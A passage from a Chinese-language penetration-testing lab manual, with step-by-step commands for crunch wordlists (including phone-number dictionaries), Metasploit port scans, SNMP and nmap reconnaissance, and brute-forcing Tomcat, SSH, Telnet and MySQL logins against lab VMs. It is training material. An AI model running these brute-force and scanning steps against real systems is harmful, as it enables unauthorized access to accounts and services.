个小写字母组成。</p></li><li><p>把字典保存成txt文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 1 4 -o passwd.txt</span><br></pre></td></tr></table></figure></li><li><p>制作以 189 开头的手机号密码字典：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 11 11 +0123456789 -t 188%%%%%%%% -o num.txt</span><br></pre></td></tr></table></figure></li><li><p>生成六位数小写字母密码，其中前四位为 “pass”：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 6 6 -t pass@@ -o passwd.txt</span><br></pre></td></tr></table></figure></li><li><p>生成六位密码，其中前四位为 “pass”，后两位为大写字母：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 6 6 -t pass,, -o passwd.txt</span><br></pre></td></tr></table></figure></li><li><p>生成六位密码，其中前四位为 “pass”，后两位为字符：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 6 6 -t pass^^ -o passwd.txt</span><br></pre></td></tr></table></figure></li><li><p>生成 4 位密码，其中格式为“两个数字” + “一个小写字母” + “常见符号”(其中数字这里被指定只能为 123 组成的所有 2 位数字组合)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 4 4 + + 123 + -t %%@^</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>掌握使用 Crunch 生成指定类型的密码文件。</p><h1 id="实验40-Metasploit-xmas实验"><a href="#实验40-Metasploit-xmas实验" class="headerlink" title="实验40 Metasploit-xmas实验"></a>实验40 Metasploit-xmas实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 xmas 扫描模块，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016<br>靶机：centos 6.9</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>通过 xmas 模块来扫描靶机</p><h2 id="实验步骤-26"><a href="#实验步骤-26" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.139 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在靶机 centos 上测试与 kali 的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.140 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在 kali 上启动 Metasploit：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li><p>使用 xmas 模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/xmas</span><br></pre></td></tr></table></figure></li><li><p>查看其它选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></li><li><p>设置靶机地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.127.139</span><br></pre></td></tr></table></figure></li><li><p>设置线程为 20：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> threads 20</span><br></pre></td></tr></table></figure></li><li><p>开始扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>掌握 Metasploit 下的 xmas 扫描靶机实验。</p><h1 id="实验41-Metasploit-tcp实验"><a href="#实验41-Metasploit-tcp实验" class="headerlink" title="实验41 Metasploit-tcp实验"></a>实验41 Metasploit-tcp实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 TCP 方式去进行扫描，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016<br>靶机：centos 6.9</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>通过 TCP 模块来扫描靶机</p><h2 id="实验步骤-27"><a href="#实验步骤-27" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.139 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在靶机 centos 上测试与 kali 的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.140 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在 kali 上启动 Metasploit：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li><p>使用 TCP 模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure></li><li><p>查看其它选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></li><li><p>设置靶机地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.127.139</span><br></pre></td></tr></table></figure></li><li><p>设置线程为 20：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> threads 20</span><br></pre></td></tr></table></figure></li><li><p>开始扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>掌握 Metasploit 下的使用 TCP 扫描。</p><h1 id="实验42-Metasploit-syn实验"><a href="#实验42-Metasploit-syn实验" class="headerlink" title="实验42 Metasploit-syn实验"></a>实验42 Metasploit-syn实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 SYN 方式去进行扫描，为避免在部署时候出现什么问题，小明</p><p>首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016<br>靶机：centos 6.9</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>通过 SYN 模块来扫描靶机</p><h2 id="实验步骤-28"><a href="#实验步骤-28" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>通过 SYN 方式对防火墙上未被屏蔽的端口进行探测。</p><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.139 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在靶机 centos 上测试与 kali 的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.140 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在 kali 上启动 Metasploit：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li><p>使用 SYN 模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/syn</span><br></pre></td></tr></table></figure></li><li><p>查看其它选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></li><li><p>设置靶机地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.127.139</span><br></pre></td></tr></table></figure></li><li><p>设置线程为 20：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> threads 20</span><br></pre></td></tr></table></figure></li><li><p>开始扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>观察使用 SYN 扫描时，扫描的结果跟 TCP 和 UDP 扫描的方式有什么不同。</p><h1 id="实验43-Metasploit-ack实验"><a href="#实验43-Metasploit-ack实验" class="headerlink" title="实验43 Metasploit-ack实验"></a>实验43 Metasploit-ack实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 ACK 方式去进行扫描，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016<br>靶机：centos 6.9</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>通过 ACK 模块来扫描靶机</p><h2 id="实验步骤-29"><a href="#实验步骤-29" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>通过 ACK 方式对防火墙上未被屏蔽的端口进行探测。</p><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.139 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在靶机 centos 上测试与 kali 的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.140 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在 kali 上启动 Metasploit：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li><p>使用 ACK 模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/ack</span><br></pre></td></tr></table></figure></li><li><p>查看其它选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></li><li><p>设置靶机地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.127.139</span><br></pre></td></tr></table></figure></li><li><p>设置线程为 20：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> threads 20</span><br></pre></td></tr></table></figure></li><li><p>开始扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>观察当使用 ACK 扫描时，扫描的结果跟 TCP 和 UDP 扫描的方式有什么不同。</p><h1 id="实验44-Metasploit-tomcat爆破实验"><a href="#实验44-Metasploit-tomcat爆破实验" class="headerlink" title="实验44 Metasploit-tomcat爆破实验"></a>实验44 Metasploit-tomcat爆破实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 metasploit 去爆破 Tomcat 的登录密码，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016<br>靶机：centos 6.9</p><p><strong>实验工具</strong></p><p>Metasploit, Tomcat</p><p><strong>实验目的</strong></p><p>使用 Metasploit 下的 tomcat 爆破模块对 Tomcat 账户进行爆破</p><h2 id="实验步骤-30"><a href="#实验步骤-30" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.137 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在靶机 centos 上测试与 kali 的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.138 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在 kali 上启动 Metasploit：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li><p>搜索有效的 Tomcat 模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search tomcat</span><br></pre></td></tr></table></figure></li><li><p>这里选择使用模块 <code>auxiliary/scanner/http/tomcat_mgr_login</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/tomcat\_mgr\_login</span><br></pre></td></tr></table></figure></li><li><p>查看 tomcat_mgr_login 模块有效选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></li><li><p>指定用户名和密码文件，这里使用默认路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> user\_file /usr/share/metasploit-framework/data/wordlists/tomcat\_mgr\_default\_users.txt</span><br><span class="line"><span class="built_in">set</span> pass\_file /usr/share/metasploit-framework/data/wordlists/tomcat\_mgr\_default\_pass.txt</span><br></pre></td></tr></table></figure></li><li><p>指定要攻击的目标服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.127.137</span><br></pre></td></tr></table></figure></li><li><p>设置服务器端口号为 8080：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rport 8080</span><br></pre></td></tr></table></figure></li><li><p>设置当渗透成功时停止：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> stop\_on\_success <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>运行攻击爆破成功密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>掌握 Metasploit 下 tomcat 爆破方法的使用，对比 medusa 爆破速度上的区别。</p><h1 id="实验-45-路由信息探测-Traceroute"><a href="#实验-45-路由信息探测-Traceroute" class="headerlink" title="实验 45 路由信息探测-Traceroute"></a>实验 45 路由信息探测-Traceroute</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Traceroute 工具，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：Kali 2016</p><p><strong>实验工具</strong></p><p>traceroute</p><p><strong>实验目的</strong></p><p>了解路由的概念和工作原理，掌握 Linux 下探测路由工具 Traceroute 的使用方法。</p><h2 id="实验步骤-31"><a href="#实验步骤-31" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>路由是信息从源穿过网络传递到目的地的行为，在传播路径中至少经过一个中间节点。Traceroute 通过发送小的数据包到目的设备直到其返回，来测量其需要多长时间。一条路径上的每个设备 Traceroute 要测 3 次。输出结果中包括每次测试的时间（ms）和设备的名称（如有的话）及其 IP 地址。</p></li><li><p>打开 Linux 终端，输入 <code>traceroute</code>，查看使用语法。</p></li><li><p>查看本机 IP 地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure></li><li><p>使用 Traceroute 来追踪本机的路由：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceroute &lt;本机IP&gt;</span><br></pre></td></tr></table></figure></li><li><p>把探测包的个数设置为值 8：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceroute -q 8 &lt;目标IP&gt;</span><br></pre></td></tr></table></figure></li><li><p>探测包使用的基本 UDP 端口设置为 6888：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceroute -p 6888 &lt;目标IP&gt;</span><br></pre></td></tr></table></figure></li><li><p>跳数设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceroute -m 15 &lt;目标IP&gt;</span><br></pre></td></tr></table></figure></li><li><p>把对外发探测包的等待响应时间设置为 3 秒：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceroute -w 3 &lt;目标IP&gt;</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>掌握使用 Traceroute 工具去探测路由信息。</p><h1 id="实验46-Metasploit之SNMP信息扫描"><a href="#实验46-Metasploit之SNMP信息扫描" class="headerlink" title="实验46 Metasploit之SNMP信息扫描"></a>实验46 Metasploit之SNMP信息扫描</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 SNMP 扫描，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：Kali 2016<br>靶机：待补充</p><p><strong>实验工具</strong></p><p>Metasploit, SNMP</p><p><strong>实验目的</strong></p><p>在 Metasploit 中利用 SNMP 进行信息扫描。</p><h2 id="实验步骤-32"><a href="#实验步骤-32" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在 Kali 终端中启动 Metasploit：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li><p>搜索当前系统内可用 SNMP 扫描模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search snmp</span><br></pre></td></tr></table></figure></li><li><p>使用 SNMP 扫描模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/snmp/snmp\_enum</span><br></pre></td></tr></table></figure></li><li><p>查看该模块的有效选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></li><li><p>设置扫描范围：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.1.0/24</span><br></pre></td></tr></table></figure></li><li><p>设置扫描线程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> THREADS 10</span><br></pre></td></tr></table></figure></li><li><p>使用 <code>run</code> 或 <code>exploit</code> 开始运行扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>在设置必选项目外其它的一些非必选项看看是什么意思。</p><h1 id="实验47-Metasploit之利用nmap扫描端口"><a href="#实验47-Metasploit之利用nmap扫描端口" class="headerlink" title="实验47 Metasploit之利用nmap扫描端口"></a>实验47 Metasploit之利用nmap扫描端口</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 nmap 扫描，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：Kali 2016<br>靶机：待补充</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>在 Metasploit 中利用 nmap 扫描端口。</p><h2 id="实验步骤-33"><a href="#实验步骤-33" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在 Kali 终端中启动 Metasploit：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li><p>检查 Metasploit 数据库是否启动（Kali 需要手动启动 PostgreSQL 数据库）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db\_status</span><br></pre></td></tr></table></figure></li><li><p>载入追踪者插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load db\_tracker</span><br></pre></td></tr></table></figure></li><li><p>启动 nmap 扫描并将结果存进数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db\_nmap –sV –O –v –T 5 192.168.1.0/24</span><br></pre></td></tr></table></figure></li><li><p>查看扫描过的主机，可以看到已经识别出的操作系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hosts</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>在 Metasploit 下的 nmap 扫描和在终端下的 nmap 扫描结果是否一样。</p><h1 id="实验48-Metasploit之SSH爆破模块"><a href="#实验48-Metasploit之SSH爆破模块" class="headerlink" title="实验48 Metasploit之SSH爆破模块"></a>实验48 Metasploit之SSH爆破模块</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 SSH 爆破，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：Kali 2016<br>靶机：待补充</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>掌握 Metasploit 下 SSH 爆破模</p><p>块的使用。</p><h2 id="实验步骤-34"><a href="#实验步骤-34" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在 Kali 虚拟机上启动 msfconsole 控制台并测试与靶机的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.1.1 -c 4</span><br></pre></td></tr></table></figure></li><li><p>使用命令搜索 SSH 登录相关的模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ssh\_login</span><br></pre></td></tr></table></figure></li><li><p>利用 SSH 爆破模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh\_login</span><br></pre></td></tr></table></figure></li><li><p>查看在该模块下需要设置的参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></li><li><p>根据提示使用 <code>set</code> 语句填写必填参数，例如远程地址、爆破用户名字典、爆破密码字典。可选参数根据需要填写：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.1.1</span><br><span class="line"><span class="built_in">set</span> USER\_FILE /path/to/usernames.txt</span><br><span class="line"><span class="built_in">set</span> PASS\_FILE /path/to/passwords.txt</span><br></pre></td></tr></table></figure></li><li><p>发起攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li><li><p>成功爆破得到 SSH 用户名和密码，进行结果验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &lt;target\_address&gt;</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>在 Metasploit 框架下的 SSH 爆破相比 Medusa 是否更具有优势。</p><h1 id="实验49-Metasploit-Telnet爆破"><a href="#实验49-Metasploit-Telnet爆破" class="headerlink" title="实验49 Metasploit-Telnet爆破"></a>实验49 Metasploit-Telnet爆破</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 Telnet 爆破，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：Kali 2016<br>靶机：待补充</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>掌握 Metasploit 下 Telnet 爆破模块的使用。</p><h2 id="实验步骤-35"><a href="#实验步骤-35" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在 Kali 虚拟机上启动 msfconsole 控制台并测试与靶机的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.1.1 -c 4</span><br></pre></td></tr></table></figure></li><li><p>使用命令搜索 Telnet 登录相关的模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search telnet\_login</span><br></pre></td></tr></table></figure></li><li><p>利用 Telnet 爆破模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/telnet/telnet\_login</span><br></pre></td></tr></table></figure></li><li><p>查看在该模块下需要设置的参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></li><li><p>根据提示使用 <code>set</code> 语句填写必填参数，例如远程地址、爆破用户名字典、爆破密码字典。可选参数根据需要填写：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.1.1</span><br><span class="line"><span class="built_in">set</span> USER\_FILE /path/to/usernames.txt</span><br><span class="line"><span class="built_in">set</span> PASS\_FILE /path/to/passwords.txt</span><br></pre></td></tr></table></figure></li><li><p>发起攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li><li><p>成功爆破得到 Telnet 用户名和密码，进行结果验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;target\_address&gt;</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>思考在设置爆破进程数的时候如何考虑进程大小。</p><h1 id="实验50-Metasploit-Mysql爆破"><a href="#实验50-Metasploit-Mysql爆破" class="headerlink" title="实验50 Metasploit-Mysql爆破"></a>实验50 Metasploit-Mysql爆破</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 MySQL 爆破，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：Kali 2016<br>靶机：待补充</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>掌握 Metasploit 下 MySQL 爆破模块的使用。</p><h2 id="实验步骤-36"><a href="#实验步骤-36" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在 Kali 虚拟机上启动 msfconsole 控制台并测试与靶机的连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.1.1 -c 4</span><br></pre></td></tr></table></figure></li><li><p>使用命令搜索 MySQL 登录相关的模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search mysql\_login</span><br></pre></td></tr></table></figure></li><li><p>利用 MySQL 爆破模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql\_login</span><br></pre></td></tr></table></figure></li><li><p>查看在该模块下需要设置的参数：</p><figure class="highlight bash"><table><tr><td 